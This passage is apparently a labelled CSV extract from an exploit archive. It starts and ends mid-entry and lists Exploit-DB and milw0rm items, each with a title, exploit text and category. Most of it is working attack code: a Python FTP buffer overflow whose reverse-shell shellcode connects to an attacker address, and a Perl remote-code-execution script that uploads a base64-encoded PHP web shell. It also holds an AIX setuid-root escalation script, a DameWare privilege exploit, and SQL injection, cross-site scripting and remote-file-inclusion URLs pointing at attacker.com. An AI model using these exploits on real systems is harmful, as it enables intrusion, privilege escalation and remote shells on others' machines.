'f970e2767d0cfe75876ea857f92e319b'   LIMIT 1   Recommendation ==============   It is recommended to upgrade to NoseRub > 0.5.2.   A preliminary patched version of the affected file can be downloaded from   SVN revision 515:   http://noserub.googlecode.com/svn/trunk/app/models/identity.php   Disclosure Timeline ===================   2007-12-19 Problem found   2007-12-19 Notified developers   2007-12-20 Received response with proposed fix   2007-12-20 Sent acknowledgment concerning fix   2007-12-26 Released advisory to public   About seclog.de ===============   seclog.de is not your average latest-vulnerability-weblog. We try to   deliver quality commentary on recent security news and issues. Our focus   ranges from secure programming, exploitation techniques, applied   cryptography, network security, privacy, biometrics to social engineering:   from the organizational and human layers to the physical and application   layers. The weblog is partly in english and german. Check it out.   Disclaimer and Copyright ========================   The author is not responsible for the misuse of the information provided in   this security advisory. Advisories are a service to the professional   security community. There are NO WARRANTIES with regard to this information.   Any application or distribution of this information constitutes acceptance   AS IS, at the user's own risk. This information is subject to change without   notice.    This advisory Copyright (C) 2007 Felix Groebert. Permission is hereby granted   to redistribute this advisory, providing that no changes are made and that   the copyright notices and disclaimers remain intact.  ############################################################################  # milw0rm.com [2007-12-28]",Login SQL Injection,1
25039,IBM AIX 5.x - 'Diag' Local Privilege Escalation source: https://www.securityfocus.com/bid/12041/info  diag is reported prone to a local privilege escalation vulnerability. This issue is due to a failure of certain diag applications to properly implement security controls when executing an application specified by the 'DIAGNOSTICS' environment variable.  A local attacker may leverage this issue to gain superuser privileges on a computer running the affected software.   mkdirhier /tmp/aap/bin export DIAGNOSTICS=/tmp/aap cat > /tmp/aap/bin/Dctrl << EOF #!/bin/sh cp /bin/sh /tmp/.shh chown root:system /tmp/.shh chmod u+s /tmp/.shh EOF chmod a+x /tmp/aap/bin/Dctrl lsmcode /tmp/.shh,Local Privilege Escalation,1
31754,"SAP Internet Transaction Server 6200.1017.50954.0 Bu (WGate) - 'wgate.dll?~service' Cross-Site Scripting source: https://www.securityfocus.com/bid/29103/info  SAP Internet Transaction Server is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.  These issues affect ITS 6200.1017.50954.0, Build 730827 (win32/IIS 5.0).   http://www.example.com/scripts/wgate.dll?~service=--><img%09src=javascript:alert(xss)",Cross-Site Scripting,1
35557,"PHP-Fusion - 'article_id' SQL Injection source: https://www.securityfocus.com/bid/47128/info  PHP-Fusion is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/[Path]/articles.php?article_id=-1+union+select+version()--",SQL Injection,1
40672,"Freefloat FTP Server 1.0 - 'RMD' Remote Buffer Overflow #!/usr/bin/env python # -*- coding: utf-8 -*- import socket   #Exploit Title: FreeFloat FTP Server Buffer Overflow RMD command #Date: 29 Octubre 2016 #Exploit Author: Karri93 #Software Link: http://www.freefloat.com/software/freefloatftpserver.zip #Version: 1.0 #Tested on: Windows XP Profesional SP3 Spanish x86    #Shellcode Metasploit: #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.7 LPORT=443 -b '\x00\x0A\x0D' -f -c  #nc -lvp 443   ret= ""\x2F\x1D\xF1\x77"" #GDI32.dll  shellcode=(""\xd9\xc4\xd9\x74\x24\xf4\x5b\x33\xc9\xb1\x52\xba\x9b\x84\x71"" ""\xb0\x83\xc3\x04\x31\x53\x13\x03\xc8\x97\x93\x45\x12\x7f\xd1"" ""\xa6\xea\x80\xb6\x2f\x0f\xb1\xf6\x54\x44\xe2\xc6\x1f\x08\x0f"" ""\xac\x72\xb8\x84\xc0\x5a\xcf\x2d\x6e\xbd\xfe\xae\xc3\xfd\x61"" ""\x2d\x1e\xd2\x41\x0c\xd1\x27\x80\x49\x0c\xc5\xd0\x02\x5a\x78"" ""\xc4\x27\x16\x41\x6f\x7b\xb6\xc1\x8c\xcc\xb9\xe0\x03\x46\xe0"" ""\x22\xa2\x8b\x98\x6a\xbc\xc8\xa5\x25\x37\x3a\x51\xb4\x91\x72"" ""\x9a\x1b\xdc\xba\x69\x65\x19\x7c\x92\x10\x53\x7e\x2f\x23\xa0"" ""\xfc\xeb\xa6\x32\xa6\x78\x10\x9e\x56\xac\xc7\x55\x54\x19\x83"" ""\x31\x79\x9c\x40\x4a\x85\x15\x67\x9c\x0f\x6d\x4c\x38\x4b\x35"" ""\xed\x19\x31\x98\x12\x79\x9a\x45\xb7\xf2\x37\x91\xca\x59\x50"" ""\x56\xe7\x61\xa0\xf0\x70\x12\x92\x5f\x2b\xbc\x9e\x28\xf5\x3b"" ""\xe0\x02\x41\xd3\x1f\xad\xb2\xfa\xdb\xf9\xe2\x94\xca\x81\x68"" ""\x64\xf2\x57\x3e\x34\x5c\x08\xff\xe4\x1c\xf8\x97\xee\x92\x27"" ""\x87\x11\x79\x40\x22\xe8\xea\xaf\x1b\xf3\xed\x47\x5e\xf3\xf0"" ""\x2c\xd7\x15\x98\x42\xbe\x8e\x35\xfa\x9b\x44\xa7\x03\x36\x21"" ""\xe7\x88\xb5\xd6\xa6\x78\xb3\xc4\x5f\x89\x8e\xb6\xf6\x96\x24"" ""\xde\x95\x05\xa3\x1e\xd3\x35\x7c\x49\xb4\x88\x75\x1f\x28\xb2"" ""\x2f\x3d\xb1\x22\x17\x85\x6e\x97\x96\x04\xe2\xa3\xbc\x16\x3a"" ""\x2b\xf9\x42\x92\x7a\x57\x3c\x54\xd5\x19\x96\x0e\x8a\xf3\x7e"" ""\xd6\xe0\xc3\xf8\xd7\x2c\xb2\xe4\x66\x99\x83\x1b\x46\x4d\x04"" ""\x64\xba\xed\xeb\xbf\x7e\x1d\xa6\x9d\xd7\xb6\x6f\x74\x6a\xdb"" ""\x8f\xa3\xa9\xe2\x13\x41\x52\x11\x0b\x20\x57\x5d\x8b\xd9\x25"" ""\xce\x7e\xdd\x9a\xef\xaa"")  buffer= '\x90'*30 + shellcode buffer1= '\x41' * 248 + ret + buffer + '\x43'*(696-len(buffer))  print ""Sending...""  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect=s.connect(('192.168.1.150',21)) s.recv(1024) s.send('USER free\r\n') s.recv(1024) s.send('PASS free\r\n') s.recv(1024) s.send('RMD' + buffer1 + '\r\n') s.close()",Remote Buffer Overflow,1
35621,"4Images 1.7.9 - Multiple Remote File Inclusions / SQL Injections source: https://www.securityfocus.com/bid/47394/info  4images is prone to multiple remote file-include vulnerabilities and an SQL-injection vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit these vulnerabilities to execute arbitrary server-side script code on an affected computer in the context of the webserver process or compromise the application, access or modify data, exploit latent vulnerabilities in the underlying database, or bypass the authentication control.  4images 1.7.9 is vulnerable; other versions may also be affected.   http://www.example.com/[path]/download.php?file_path=[Ev!l-Sh3ll] http://www.example.com/[path]/categories.php?upload_url=[Ev!l-Sh3ll] http://www.example.com/[path]/global.php?config=[Ev!l-Sh3ll http://www.example.com/[path]/details.php?cat_id_sql=0+AND+2=1",Remote File Inclusions,1
7217,"Quicksilver Forums 1.4.2 (Windows) - Remote Code Execution # Author:	__GiReX__ # Homepage:	girex.altervista.org  # Date:		24/11/2008  # CMS:		Quicksilver Forums <= 1.4.2 # Site:		http://www.quicksilverforums.com/  # Bug:		Local File Inclusion # Exploit:	Remote Command Execution  # Note:		Works with windows servers only 		Works regardless php.ini settings  # Bug Discussion:  # file: global.php # lines: 318-329  	function get_lang($lang, $a = null, $path = './', $main = true) 	{ 		if (isset($this->get['lang'])) { 			$lang = $this->get['lang'];   		}   		if (strstr($lang, '/') || !file_exists($path . 'languages/' . $lang . '.php')) { 			$lang = 'en'; 		}   		include $path . 'languages/' . $lang . '.php';   # As you can see, Quicksilver filter can be easily bypassed in windows servers # couse use of backslashes ""\"" in filesystem's paths.  # Thanks to the functions uset_magic_quotes_gpc() this vuln works regardless php.ini setting  # We can upload a malicious avatar and include it to have a RCE   #!/usr/bin/perl  # Quicksilver Forums <= 1.4.2 RCE Exploit (win only) # Local File Inclusion / Malicious Avatar Upload # Coded by __GiReX__  use IO::Socket::INET; use MIME::Base64;  if(@ARGV < 3) {     banner();     print ""[+] You need an user account to run this exploit\n\n"";     print ""[+] Usage: perl $0 <host> <path> <your_username> <your_pass>\n"";     print ""[+] Example: perl $0 localhost /quick/ test password\n"";     exit; }  my ($host, $path, $user, $pass) = @ARGV;  $host =~ s/^http:\/\///; $host =~ s/^www\.//;  $target = ""http://${host}${path}"";  banner();	 check_vuln();   $cookie = do_login() or debug($debug, 1);  upload_avatar() or debug($debug, 2);    while(1) { 	print ""[+] shell\@quick:\$ ""; 	chomp(my $cmd = <STDIN>); 	 	exit if $cmd eq 'exit'; 	create_socket(); 	 	print $sd  ""GET ${target}index.php?lang=..\\avatars\\uploaded\\${user_id}.png%00 HTTP/1.1\r\n"". 			   ""Host: $host\r\n"". 			   ""Cookie: $cookie\r\n"". 			   ""CMD: "". encode_base64($cmd).""\r\n"". 			   ""Connection: keep-alive\r\n\r\n""; 	 	$out .= $_ while <$sd>; 	 	if($out =~ /-code-/) 	{ 		$_out = substr($out, index($out, '-code-') + 6);  $n = index($_out, '-code'); 		$__out = substr($_out, 0, $n); 	} 	else 	{ 		debug($out, 3); 	} 	 	close($sd); 	$out = undef; 	 	print STDOUT ""\n"". $__out.""\n""; }  sub check_vuln { 	create_socket(); 	 	print $sd   ""GET ${target}index.php?lang=..\\languages\\en.php%00 HTTP/1.1\r\n"". 				""Host: $host\r\n"". 				""Connection: keep-alive\r\n\r\n""; 				 	while(my $res = <$sd>) 	{ 		$ok = 1 if $res =~ /404 Not Found/; 		 		if($res =~ /<b>Fatal error<\/b>/) 		{ 			close($sd); 			return 1; 		} 		 		our $debug .= $res; 	} 	 	print STDOUT ""\n[-] Server not vulnerable, maybe it's not a win server!\n"" and exit 	if not defined $ok; 	 	debug($debug, 0); } 		  sub do_login {          create_socket(); 	my $data = ""user=${user}&pass=${pass}&request_uri=%2F${path}%2Findex.php&submit=Invia""; 	 	print $sd   ""POST ${target}index.php?a=login&s=on HTTP/1.1\r\n"" . 				""Host: $host\r\n"" . 				""Connection: keep-alive\r\n"" . 				""Content-Type: application/x-www-form-urlencoded\r\n"" . 				""Content-Length: "". length($data).""\r\n\r\n"" . 				$data . ""\r\n\r\n"";      	 	 	while(my $res = <$sd>) 	{ 		if($res =~ /Set-Cookie: (\w+)_user=([0-9]+)/) 		{ 		    $prefix  = $1  unless $prefix;  		    $user_id = $2  unless $user_id; 		} 		elsif($res =~ /Set-Cookie: \w+_pass=([a-z0-9]{32})/) 		{ 			my $hash_pwd = $1;  close($sd); 			print STDOUT ""\n[+] Logged in with $user account\n""; 			 			return ""${prefix}_user=${user_id}; ${prefix}_pass=${hash_pwd};""; 		} 		 		our $debug .= $res; 	}	  	close($sd);	 	return undef; }  sub upload_avatar { 	create_socket(); 						# Image content + post's var base64 encoded     my $data =  ""LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0yMjY0ODI3NDQ2MjM4MDUNCk"".                  ""NvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0idXNlcl9hdmF"".                  ""0YXJfd2lkdGgiDQoNCjUwDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t"".                  ""LTIyNjQ4Mjc0NDYyMzgwNQ0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kY"".                  ""XRhOyBuYW1lPSJ1c2VyX2F2YXRhcl9oZWlnaHQiDQoNCjUwDQotLS0tLS0tLS"".                  ""0tLS0tLS0tLS0tLS0tLS0tLS0tLTIyNjQ4Mjc0NDYyMzgwNQ0KQ29udGVudC1E"".                  ""aXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJ1c2VyX2F2YXRhcl90eXBlI"".                  ""g0KDQp1cGxvYWQNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMjI2ND"".                  ""gyNzQ0NjIzODA1DQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5"".                  ""hbWU9ImF2YXRhcl91cGxvYWQiOyBmaWxlbmFtZT0iYXZhdF9hci5wbmciDQpD"".                  ""b250ZW50LVR5cGU6IGltYWdlL3BuZw0KDQo8P3BocA0KaWYoaXNzZXQoJF9TRV"".                  ""JWRVJbJ0hUVFBfQ01EJ10pKQp7CmVjaG8gIi1jb2RlLSI7IHBhc3N0aHJ1KGJ"".                  ""hc2U2NF9kZWNvZGUoJF9TRVJWRVJbJ0hUVFBfQ01EJ10pKTsgZWNobyAiLWNv"".                  ""ZGUiOwp9DQpkaWUoKTsNCj8+DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tL"".                  ""S0tLTIyNjQ4Mjc0NDYyMzgwNQ0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS"".                  ""1kYXRhOyBuYW1lPSJzdWJtaXQiDQoNClN1Ym1pdA0KLS0tLS0tLS0tLS0tLS0t"".                  ""LS0tLS0tLS0tLS0tLS0yMjY0ODI3NDQ2MjM4MDUtLQ0K""; 				  	$data = decode_base64($data);  	print $sd  ""POST ${target}index.php?a=cp&s=avatar HTTP/1.1\r\n"". 			   ""Host: $host\r\n"" . 			   ""Connection: keep-alive\r\n"" . 			   ""Cookie: $cookie\r\n"" .                ""Content-Type: multipart/form-data; boundary=---------------------------226482744623805\r\n"" .                ""Content-Length: "". length($data).""\r\n\r\n"" . 			   $data . ""\r\n\r\n""; 		    	 	while(my $res = <$sd>) 	{ 		if($res =~ /Your avatar has been updated/) 		{ 			print ""[+] Malicious avatar uploaded\n\n"";   close($sd); 			return 1; 		} 		 		our $debug 	.= $res; 	} 	 	close($sd); 	return undef; }  sub create_socket { 	our $sd = new IO::Socket::INET( 'PeerAddr' => $host, 									'PeerPort' => '80', 									'Proto'    => 'tcp', 								   ) or die $@; }  sub debug { 	my $output = shift; 	my $errno = shift; 	 	open(DEBUG, '>', 'debug.txt'); 	print DEBUG $debug; 	 	if($errno eq '0') 	{ 		print STDOUT ""\n[-] Unable to request index.php! See debug.txt for more infos\n""; 	} 	if($errno eq '1') 	{ 		print STDOUT ""\n[-] Unable to login! See debug.txt for more infos.\n""; 	} 	elsif($errno eq '2') 	{ 		print STDOUT ""\n[-] Unable to upload avatar! See debug.txt for more infos.\n""; 	} 	elsif($errno eq '3') 	{ 		print STDOUT ""\n[-] Exploit mistake! See debug.txt for more infos.\n""; 	} 	 	close(DEBUG); 	exit; }  sub banner { 	print STDOUT ""\n[+] Quicksilver Forums <= 1.4.2 RCE Exploit (win only)\n"". 				 ""[+] Local File Inclusion / Malicious Avatar Upload\n"". 				 ""[+] Coded by __GiReX__\n\n""; }  # milw0rm.com [2008-11-24]",Remote Code Execution,1
79,"DameWare Mini Remote Control Server - System /*  DameWare Mini Remote Control Server Local SYSTEM Exploit Vulnerable Versions Prior to 3.71.0.0 by ash@felinemenace.org  	 This code is based on shards.cpp by xenophile  */  #define WIN32_LEAN_AND_MEAN #include <windows.h> #include <stdio.h> #pragma warning(disable: 4305) #pragma warning(disable: 4309) void MakeShellCode (char *buffer) { HMODULE hCRT; void * lpSystem; int count=0;  while (count < 36) { buffer [count] =0x90; count ++; }  buffer[37]=0x8B; buffer[38]=0xE5; buffer[39]=0x55; buffer[40]=0x8B; buffer[41]=0xEC; buffer[42]=0x33; buffer[43]=0xFF; buffer[44]=0x90; buffer[45]=0x57; buffer[46]=0x83; buffer[47]=0xEC; buffer[48]=0x04; buffer[49]=0xC6; buffer[50]=0x45; buffer[51]=0xF8; buffer[52]=0x63; buffer[53]=0xC6; buffer [54]=0x45; buffer[55]=0xF9; buffer[56]=0x6D; buffer [57]=0xC6; buffer[58]=0x45; buffer[59]=0xFA; buffer[60]=0x64; buffer[61]=0xC6; buffer[62]=0x45; buffer[63]=0xFB; buffer[64]=0x2E; buffer[65]=0xC6; buffer[66]=0x45; buffer[67]=0xFC; buffer[68]=0x65; buffer[69]=0xC6; buffer[70]=0x45; buffer[71]=0xFD; buffer [72]=0x78; buffer[73]=0xC6; buffer[74]=0x45; buffer [75] =0xFE; buffer[76]=0x65;  hCRT = LoadLibrary(""msvcrt.dll""); lpSystem = GetProcAddress( hCRT, ""system"" ); buffer[77]=0xB8; buffer[78]=((char *)&lpSystem) [0]; buffer[79]=((char *)&lpSystem) [1]; buffer[80]=((char *)&lpSystem) [2]; buffer[81]=((char *)&lpSystem) [3]; buffer [82] =0x50; buffer[83]=0x8D; buffer[84]=0x45; buffer[85]=0xF8; buffer[86]=0x50; buffer[87]=0xFF; buffer [88]=0x55; buffer[89]=0xF4; count = 90; while (count < 291) { buffer [count] =0x90; count ++; } buffer[291]=0x24; buffer[292]=0xF1; buffer [293]=0x5D; buffer[294]=0x01; buffer[295]=0x26; buffer[296]=0xF1; buffer [297] =0x5D; buffer[298]=0x01; buffer[299]=0x00; buffer[300]=0x00; return; } void ErrorNotify(DWORD err, char *title) { LPVOID lpMsgBuf; FormatMessage( FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL, err, MAKELANGID (LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language (LPTSTR) &lpMsgBuf, 0, NULL ) ;  printf(""%s\n"",lpMsgBuf);  LocalFree( lpMsgBuf ); }; #define SHELLCODE_SIZE (1024 * 256) #define SHELLCODE_OFFSET (SHELLCODE_SIZE -400) int main(int argc, char* argv[]) { HWND hWnd; HWND hWndChild; char sc[SHELLCODE_SIZE]; char szWindowName[] = ""About DameWare Mini Remote Control Server""; LONG lExecAddress; sc[0] = 'x'; sc[1] = 'e'; sc[2] = 'n'; sc[3] = '0'; memset( &sc[4], 0x90, SHELLCODE_SIZE -4); MakeShellCode( &sc[SHELLCODE_OFFSET] ); printf( ""\nfm-shatterdame.c\nash@felinemenace.org\n"" ); printf(""--------------------------------------------------------------\n""); printf(""Exploits shatter attack in DameWare Mini Remote Control  Server\n""); printf(""This is based on shards.cpp written by xenophile.\n"") ; printf(""--------------------------------------------------------------\n""); printf( ""STEP 1: Finding our window!\n"" ) ;    hWnd = FindWindow( NULL, szWindowName ); if( hWnd == NULL) {  	printf(""Couldn't find the dameware about dialogue. Open it and re-run  this\n""); return 0; }  hWndChild = FindWindowEx(hWnd, NULL, ""Edit"", NULL);  if( hWndChild == NULL) {  printf(""\tCouldn't find child edit control window\n"");  return 0; }  SendMessage( hWndChild, EM_SETREADONLY, 0, 0 );  SendMessage( hWndChild, EM_SETLIMITTEXT, SHELLCODE_SIZE, 0L );  if ( ! SendMessage( hWndChild, WM_SETTEXT, 0, (LPARAM)sc ) ) { ErrorNotify ( GetLastError (), ""error""); } printf( ""\n\nSTEP 2: Enter shell code address. "" ""This can be found using a debugger."" ) ; printf( ""\nOn my XP SP1 machine 0x160000 worked.\n"" );  printf( ""\n\nEnter execution address: "" ); scanf( ""%x"", &lExecAddress );  if ( ! SendMessage( hWndChild, EM_SETWORDBREAKPROC, 0L,  (LPARAM)lExecAddress ) ) { ErrorNotify( GetLastError(), ""error"" ); }  SendMessage( hWndChild, WM_LBUTTONDBLCLK, MK_LBUTTON,  (LPARAM)0x000a000a );  return 0; }  // milw0rm.com [2003-08-13]",Local SYSTEM Exploit,0
22927,"SimpNews 2.0.1/2.13 - 'path_simpnews' Remote File Inclusion source: https://www.securityfocus.com/bid/8227/info  SimpNews is prone to a vulnerability that may permit remote attackers to include and execute malicious PHP scripts. Remote users, under some PHP configurations, may influence a Simpnews URI variable. This variable is used in the include path for several SimpNews configuration scripts. By influencing the include path so that it points to a malicious PHP script on a remote system, it is possible to cause arbitrary PHP code to be executed.  http://www.example.com/eventcal2.php.php?path_simpnews= with http://www.attacker.com/config.php http://www.attacker.com/functions.php http://www.attacker.com/includes/has_entries.inc or  http://www.example.com/eventscroller.php?path_simpnews= with http://www.attacker.com/config.php http://www.attacker.com/functions.php",Remote File Inclusion,1
25386,"Microsoft Internet Explorer 5.0.1 - DHTML Object Race Condition Memory Corruption source: https://www.securityfocus.com/bid/13120/info  A vulnerability in Microsoft Internet Explorer may allow remote attackers to execute arbitrary code in the context of users visiting malicious Web sites.  This issue presents itself the affected application attempts to process certain script objects, a race condition may lead to the execution of attacker-supplied code.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/25386.zip",DHTML Object Race Condition Memory Corruption,1
45772,"Zint Barcode Generator 2.6 - Denial of Service (PoC) # Exploit Title: Zint Barcode Generator 2.6 - Denial of Service (PoC) # Dork: N/A # Date: 2018-11-01 # Exploit Author: Ihsan Sencan # Vendor Homepage: http://www.zint.org.uk # Software Link: https://sourceforge.net/projects/zint/files/latest/download # Version: 2.6 # Category: Dos # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1) # Add 2D Component / 2D Component Data  #!/usr/bin/python      buffer = ""A"" * 44450   payload = buffer try:     f=open(""exp.txt"",""w"")     print ""[+] Creating %s bytes evil payload."" %len(payload)     f.write(payload)     f.close()     print ""[+] File created!"" except:     print ""File cannot be created.""",Denial of Service,1
25912,"Microsoft Windows NT/2000/2003/2008/XP/Vista/7/8 - 'EPATHOBJ' Local Ring #ifndef WIN32_NO_STATUS # define WIN32_NO_STATUS #endif #include <stdio.h> #include <stdarg.h> #include <stddef.h> #include <windows.h> #include <assert.h> #ifdef WIN32_NO_STATUS # undef WIN32_NO_STATUS #endif #include <ntstatus.h>  #pragma comment(lib, ""gdi32"") #pragma comment(lib, ""kernel32"") #pragma comment(lib, ""user32"") #pragma comment(lib, ""shell32"") #pragma comment(linker, ""/SECTION:.text,ERW"")  #ifndef PAGE_SIZE # define PAGE_SIZE 0x1000 #endif  #define MAX_POLYPOINTS (8192 * 3) #define MAX_REGIONS 8192 #define CYCLE_TIMEOUT 10000  // // -------------------------------------------------- // Windows NT/2K/XP/2K3/VISTA/2K8/7/8 EPATHOBJ local ring0 exploit // ----------------------------------------- taviso () cmpxchg8b com ----- // // INTRODUCTION // // There's a pretty obvious bug in win32k!EPATHOBJ::pprFlattenRec where the // PATHREC object returned by win32k!EPATHOBJ::newpathrec doesn't initialise the // next list pointer. The bug is really nice, but exploitation when // allocations start failing is tricky. // // ; BOOL __thiscall EPATHOBJ::newpathrec(EPATHOBJ     *this, //                                        PATHRECORD   **pppr, //                                        ULONG         *pcMax, //                                        ULONG cNeeded) //  .text:BFA122CA                 mov     esi, [ebp+ppr] //  .text:BFA122CD                 mov     eax, [esi+PATHRECORD.pprPrev] //  .text:BFA122D0                 push    edi //  .text:BFA122D1                 mov     edi, [ebp+pprNew] //  .text:BFA122D4                 mov     [edi+PATHRECORD.pprPrev], eax //  .text:BFA122D7                 lea     eax, [edi+PATHRECORD.count] //  .text:BFA122DA                 xor     edx, edx //  .text:BFA122DC                 mov     [eax], edx //  .text:BFA122DE                 mov     ecx, [esi+PATHRECORD.flags] //  .text:BFA122E1                 and     ecx, not (PD_BEZIER) //  .text:BFA122E4                 mov     [edi+PATHRECORD.flags], ecx  //  .text:BFA122E7                 mov     [ebp+pprNewCountPtr], eax //  .text:BFA122EA                 cmp     [edi+PATHRECORD.pprPrev], edx //  .text:BFA122ED                 jnz     short loc_BFA122F7 //  .text:BFA122EF                 mov     ecx, [ebx+EPATHOBJ.ppath] //  .text:BFA122F2                 mov     [ecx+PATHOBJ.pprfirst], edi // //  It turns out this mostly works because newpathrec() is backed by newpathalloc() //  which uses PALLOCMEM(). PALLOCMEM() will always zero the buffer returned. // //  ; PVOID __stdcall PALLOCMEM(size_t size, int tag) //  .text:BF9160D7                 xor     esi, esi //  .text:BF9160DE                 push    esi //  .text:BF9160DF                 push    esi //  .text:BF9160E0                 push    [ebp+tag] //  .text:BF9160E3                 push    [ebp+size] //  .text:BF9160E6                 call    _HeavyAllocPool () 16 ; HeavyAllocPool(x,x,x,x) //  .text:BF9160EB                 mov     esi, eax //  .text:BF9160ED                 test    esi, esi //  .text:BF9160EF                 jz      short loc_BF9160FF //  .text:BF9160F1                 push    [ebp+size]      ; size_t //  .text:BF9160F4                 push    0               ; int //  .text:BF9160F6                 push    esi             ; void * //  .text:BF9160F7                 call    _memset // //  However, the PATHALLOC allocator includes it's own freelist implementation, and //  if that codepath can satisfy a request the memory isn't zeroed and returned //  directly to the caller. This effectively means that we can add our own objects //  to the PATHRECORD chain. // //  We can force this behaviour under memory pressure relatively easily, I just //  spam HRGN objects until they start failing. This isn't super reliable, but it's //  good enough for testing. // //          // I don't use the simpler CreateRectRgn() because it leaks a GDI handle on //          // failure. Seriously, do some damn QA Microsoft, wtf. //          for (Size = 1 << 26; Size; Size >>= 1) { //              while (CreateRoundRectRgn(0, 0, 1, Size, 1, 1)) //                  ; //          } // //  Adding user controlled blocks to the freelist is a little trickier, but I've //  found that flattening large lists of bezier curves added with PolyDraw() can //  accomplish this reliably. The code to do this is something along the lines of: // //          for (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++) { //              Points[PointNum].x      = 0x41414141 >> 4; //              Points[PointNum].y      = 0x41414141 >> 4; //              PointTypes[PointNum]    = PT_BEZIERTO; //          } // //          for (PointNum = MAX_POLYPOINTS; PointNum; PointNum -= 3) { //              BeginPath(Device); //              PolyDraw(Device, Points, PointTypes, PointNum); //              EndPath(Device); //              FlattenPath(Device); //              FlattenPath(Device); //              EndPath(Device); //          } // //   We can verify this is working by putting a breakpoint after newpathrec, and //   verifying the buffer is filled with recognisable values when it returns: // //   kd> u win32k!EPATHOBJ::pprFlattenRec+1E //   win32k!EPATHOBJ::pprFlattenRec+0x1e: //   95c922b8 e8acfbffff      call    win32k!EPATHOBJ::newpathrec (95c91e69) //   95c922bd 83f801          cmp     eax,1 //   95c922c0 7407            je      win32k!EPATHOBJ::pprFlattenRec+0x2f (95c922c9) //   95c922c2 33c0            xor     eax,eax //   95c922c4 e944020000      jmp     win32k!EPATHOBJ::pprFlattenRec+0x273 (95c9250d) //   95c922c9 56              push    esi //   95c922ca 8b7508          mov     esi,dword ptr [ebp+8] //   95c922cd 8b4604          mov     eax,dword ptr [esi+4] //   kd> ba e 1 win32k!EPATHOBJ::pprFlattenRec+23 ""dd poi(ebp-4) L1; gc"" //   kd> g //   fe938fac  41414140 //   fe938fac  41414140 //   fe938fac  41414140 //   fe938fac  41414140 //   fe938fac  41414140 // //   The breakpoint dumps the first dword of the returned buffer, which matches the //   bezier points set with PolyDraw(). So convincing pprFlattenRec() to move //   EPATHOBJ->records->head->next->next into userspace is no problem, and we can //   easily break the list traversal in bFlattten(): // //   BOOL __thiscall EPATHOBJ::bFlatten(EPATHOBJ *this) //   { //     EPATHOBJ *pathobj; // esi () 1 //     PATHOBJ *ppath; // eax () 1 //     BOOL result; // eax () 2 //     PATHRECORD *ppr; // eax () 3 // //     pathobj = this; //     ppath = this->ppath; //     if ( ppath ) //     { //       for ( ppr = ppath->pprfirst; ppr; ppr = ppr->pprnext ) //       { //         if ( ppr->flags & PD_BEZIER ) //         { //           ppr = EPATHOBJ::pprFlattenRec(pathobj, ppr); //           if ( !ppr ) //             goto LABEL_2; //         } //       } //       pathobj->fl &= 0xFFFFFFFE; //       result = 1; //     } //     else //     { //   LABEL_2: //       result = 0; //     } //     return result; //   } // //   All we have to do is allocate our own PATHRECORD structure, and then spam //   PolyDraw() with POINTFIX structures containing co-ordinates that are actually //   pointers shifted right by 4 (for this reason the structure must be aligned so //   the bits shifted out are all zero). // //   We can see this in action by putting a breakpoint in bFlatten when ppr has //   moved into userspace: // //   kd> u win32k!EPATHOBJ::bFlatten //   win32k!EPATHOBJ::bFlatten: //   95c92517 8bff            mov     edi,edi //   95c92519 56              push    esi //   95c9251a 8bf1            mov     esi,ecx //   95c9251c 8b4608          mov     eax,dword ptr [esi+8] //   95c9251f 85c0            test    eax,eax //   95c92521 7504            jne     win32k!EPATHOBJ::bFlatten+0x10 (95c92527) //   95c92523 33c0            xor     eax,eax //   95c92525 5e              pop     esi //   kd> u //   win32k!EPATHOBJ::bFlatten+0xf: //   95c92526 c3              ret //   95c92527 8b4014          mov     eax,dword ptr [eax+14h] //   95c9252a eb14            jmp     win32k!EPATHOBJ::bFlatten+0x29 (95c92540) //   95c9252c f6400810        test    byte ptr [eax+8],10h //   95c92530 740c            je      win32k!EPATHOBJ::bFlatten+0x27 (95c9253e) //   95c92532 50              push    eax //   95c92533 8bce            mov     ecx,esi //   95c92535 e860fdffff      call    win32k!EPATHOBJ::pprFlattenRec (95c9229a) // //   So at 95c9252c eax is ppr->next, and the routine checks for the PD_BEZIERS //   flags (defined in winddi.h). Let's break if it's in userspace: // //   kd> ba e 1 95c9252c ""j (eax < poi(nt!MmUserProbeAddress)) 'gc'; ''"" //   kd> g //   95c9252c f6400810        test    byte ptr [eax+8],10h //   kd> r //   eax=41414140 ebx=95c1017e ecx=97330bec edx=00000001 esi=97330bec edi=0701062d //   eip=95c9252c esp=97330be4 ebp=97330c28 iopl=0         nv up ei pl nz na po nc //   cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010202 //   win32k!EPATHOBJ::bFlatten+0x15: //   95c9252c f6400810        test    byte ptr [eax+8],10h       ds:0023:41414148=?? // //   The question is how to turn that into code execution? It's obviously trivial to //   call prFlattenRec with our userspace PATHRECORD..we can do that by setting //   PD_BEZIER in our userspace PATHRECORD, but the early exit on allocation failure //   poses a problem. // //   Let me demonstrate calling it with my own PATHRECORD: // //       // Create our PATHRECORD in userspace we will get added to the EPATHOBJ //       // pathrecord chain. //       PathRecord = VirtualAlloc(NULL, //                                 sizeof(PATHRECORD), //                                 